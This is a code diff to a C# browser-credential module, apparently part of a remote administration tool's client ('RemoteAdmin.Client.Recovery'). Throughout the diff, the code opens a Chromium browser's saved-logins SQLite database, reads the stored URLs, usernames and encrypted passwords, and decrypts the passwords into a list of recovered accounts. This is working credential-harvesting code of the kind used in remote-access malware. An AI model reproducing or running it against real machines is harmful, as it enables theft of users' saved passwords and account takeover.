@@ -1,28 +1,20 @@
-using RemoteAdmin.Shared;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using RemoteAdmin.Shared;
 
 namespace RemoteAdmin.Client.Recovery.Browsers
 {
-    /// <summary>
-    /// Provides basic account recovery capabilities from chromium-based applications.
-    /// </summary>
-    public abstract class ChromiumBase
+    public abstract class ChromiumBase : IAccountReader
     {
-        /// <summary>
-        /// The name of the application.
-        /// </summary>
+        /// <inheritdoc />
         public abstract string ApplicationName { get; }
 
-        /// <summary>
-        /// Reads the stored accounts.
-        /// </summary>
-        /// <returns>A list of recovered accounts.</returns>
-        public abstract List<RecoveredAccount> ReadAccounts();
+        /// <inheritdoc />
+        public abstract IEnumerable<RecoveredAccount> ReadAccounts();
 
         /// <summary>
-        /// Reads the stored accounts of a chromium-based application.
+        /// Reads the stored accounts of an chromium-based application.
         /// </summary>
         /// <param name="filePath">The file path of the logins database.</param>
         /// <param name="localStatePath">The file path to the local state.</param>
@@ -31,54 +23,55 @@ namespace RemoteAdmin.Client.Recovery.Browsers
         {
             var result = new List<RecoveredAccount>();
 
-            if (!File.Exists(filePath))
+            if (File.Exists(filePath))
             {
-                Console.WriteLine($"{ApplicationName}: Login Data file not found at {filePath}");
-                return result;
-            }
+                SQLiteHandler sqlDatabase;
 
-            try
-            {
+                if (!File.Exists(filePath))
+                    return result;
+
                 var decryptor = new ChromiumDecryptor(localStatePath);
 
-                using (var sqlDatabase = new SQLiteHandler(filePath))
+                try
                 {
-                    var loginDataList = sqlDatabase.ReadLogins();
-
-                    foreach (var loginData in loginDataList)
-                    {
-                        try
-                        {
-                            var host = loginData.Url;
-                            var user = loginData.Username;
-
-                            // Decrypt the password
-                            var pass = decryptor.Decrypt(loginData.EncryptedPassword);
-
-                            if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
-                            {
-                                result.Add(new RecoveredAccount
-                                {
-                                    Url = host,
-                                    Username = user,
-                                    Password = pass,
-                                    Application = ApplicationName
-                                });
-                            }
-                        }
-                        catch (Exception ex)
-                        {
-                            // Ignore invalid entries
-                            Console.WriteLine($"{ApplicationName}: Failed to decrypt entry - {ex.Message}");
-                        }
-                    }
+                    sqlDatabase = new SQLiteHandler(filePath);
+                }
+                catch (Exception)
+                {
+                    return result;
                 }
 
-                Console.WriteLine($"{ApplicationName}: Successfully recovered {result.Count} passwords");
+                if (!sqlDatabase.ReadTable("logins"))
+                    return result;
+
+                for (int i = 0; i < sqlDatabase.GetRowCount(); i++)
+                {
+                    try
+                    {
+                        var host = sqlDatabase.GetValue(i, "origin_url");
+                        var user = sqlDatabase.GetValue(i, "username_value");
+                        var pass = decryptor.Decrypt(sqlDatabase.GetValue(i, "password_value"));
+
+                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
+                        {
+                            result.Add(new RecoveredAccount
+                            {
+                                Url = host,
+                                Username = user,
+                                Password = pass,
+                                Application = ApplicationName
+                            });
+                        }
+                    }
+                    catch (Exception)
+                    {
+                        // ignore invalid entry
+                    }
+                }
             }
-            catch (Exception ex)
+            else
             {
-                Console.WriteLine($"{ApplicationName}: Error reading accounts - {ex.Message}");
+                throw new FileNotFoundException("Can not find chromium logins file");
             }
 
             return result;
